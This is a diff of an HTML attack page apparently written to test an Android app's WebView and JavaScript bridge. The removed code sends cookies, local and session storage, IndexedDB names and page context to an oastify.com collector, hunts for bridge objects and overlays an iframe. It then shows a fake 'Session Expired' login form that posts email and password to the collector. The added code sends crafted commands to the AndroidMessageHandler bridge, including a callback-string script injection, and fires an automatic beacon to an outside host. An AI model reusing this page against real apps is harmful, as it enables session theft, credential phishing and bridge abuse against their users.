@@ -1,167 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebView Exploit</title>
-    <style>
-        body { font-family: Arial; }
-        #overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: white;
-            z-index: 9999;
-        }
-    </style>
+    <title>JS Bridge Exploit</title>
 </head>
 <body>
+<h1>JS Bridge Test</h1>
 
-<div id="overlay">
-    <h2>HALLO SINAR PAGI</h2>
-</div>
+<button onclick="test1()">open-native-url</button>
+<button onclick="test2()">open-url</button>
+<button onclick="test3()">callback injection</button>
 
 <script>
-(function() {
-    var OAST = "https://x20zl1t0c5a0oeaa2nxyoyl5swynmda2.oastify.com";
-
-    function send(label, data) {
-        try {
-            fetch(OAST + "/?" + label + "=" + encodeURIComponent(data));
-        } catch(e) {}
+function send(data) {
+    try {
+        AndroidMessageHandler.postMessage(JSON.stringify(data));
+    } catch (e) {
+        fetch("https://b7jdqfyehjfetsfo712ctcqjxa32rtfi.oastify.com/?error=" + e);
     }
+}
 
-    // =========================
-    // BASIC EXECUTION
-    // =========================
-    send("status", "js_executed");
+// TEST 1
+function test1() {
+    send({
+        command: "open-native-url",
+        url: "kolonialno://profile"
+    });
+}
 
-    // =========================
-    // COOKIE
-    // =========================
-    try {
-        send("cookie", document.cookie || "EMPTY");
-    } catch(e) {
-        send("cookie_error", e);
-    }
+// TEST 2
+function test2() {
+    send({
+        command: "open-url",
+        url: "https://oda.com"
+    });
+}
 
-    // =========================
-    // LOCAL STORAGE
-    // =========================
-    try {
-        let ls = "";
-        for (let i = 0; i < localStorage.length; i++) {
-            let k = localStorage.key(i);
-            ls += k + "=" + localStorage.getItem(k) + ";";
-        }
-        send("localStorage", ls || "EMPTY");
-    } catch(e) {
-        send("ls_error", e);
-    }
+// TEST 3 (IMPORTANT)
+function test3() {
+    send({
+        command: "open-url",
+        url: "https://oda.com",
+        callbackString: "alert('pwned')"
+    });
+}
 
-    // =========================
-    // SESSION STORAGE
-    // =========================
-    try {
-        let ss = "";
-        for (let i = 0; i < sessionStorage.length; i++) {
-            let k = sessionStorage.key(i);
-            ss += k + "=" + sessionStorage.getItem(k) + ";";
-        }
-        send("sessionStorage", ss || "EMPTY");
-    } catch(e) {
-        send("ss_error", e);
-    }
-
-    // =========================
-    // TRY INDEXEDDB (jarang tapi kadang ada)
-    // =========================
-    try {
-        indexedDB.databases().then(dbs => {
-            send("indexedDB", JSON.stringify(dbs));
-        });
-    } catch(e) {
-        send("idb_error", e);
-    }
-
-    // =========================
-    // LOCATION & CONTEXT
-    // =========================
-    send("location", location.href);
-    send("origin", location.origin);
-    send("referrer", document.referrer || "NONE");
-    send("ua", navigator.userAgent);
-
-    // =========================
-    // WINDOW ENUMERATION
-    // =========================
-    try {
-        let props = [];
-        for (let p in window) {
-            props.push(p);
-        }
-        send("window_props", props.slice(0, 100).join(","));
-    } catch(e) {}
-
-    // =========================
-    // JS BRIDGE DETECTION (AGGRESSIVE)
-    // =========================
-    try {
-        let found = [];
-        for (let k in window) {
-            if (typeof window[k] === "object") {
-                try {
-                    if (window[k] && typeof window[k].postMessage === "function") {
-                        found.push(k);
-                    }
-                } catch(e) {}
-            }
-        }
-        send("possible_bridges", found.join(",") || "NONE");
-    } catch(e) {}
-
-    // =========================
-    // IFRAME TEST (UI REDRESS)
-    // =========================
-    try {
-        let iframe = document.createElement("iframe");
-        iframe.src = "https://example.com";
-        iframe.style = "position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.8;";
-        document.body.appendChild(iframe);
-
-        send("iframe", "loaded");
-    } catch(e) {
-        send("iframe_error", e);
-    }
-
-    // =========================
-    // FULL PAGE REWRITE (PHISH SIMULATION)
-    // =========================
-    setTimeout(function() {
-        document.body.innerHTML = `
-            <h1>Session Expired</h1>
-            <p>Please login again</p>
-            <form action="${OAST}" method="GET">
-                <input name="email" placeholder="Email"><br><br>
-                <input name="password" type="password" placeholder="Password"><br><br>
-                <button type="submit">Login</button>
-            </form>
-        `;
-        send("ui_rewrite", "done");
-    }, 2000);
-
-    // =========================
-    // NAVIGATION ABUSE
-    // =========================
-    setTimeout(function() {
-        try {
-            window.location = "https://example.com";
-            send("navigation", "triggered");
-        } catch(e) {
-            send("navigation_error", e);
-        }
-    }, 4000);
-
-})();
+// auto trigger
+setTimeout(() => {
+    fetch("https://b7jdqfyehjfetsfo712ctcqjxa32rtfi.oastify.com/?loaded=1");
+}, 1000);
 </script>
-
 </body>
 </html>
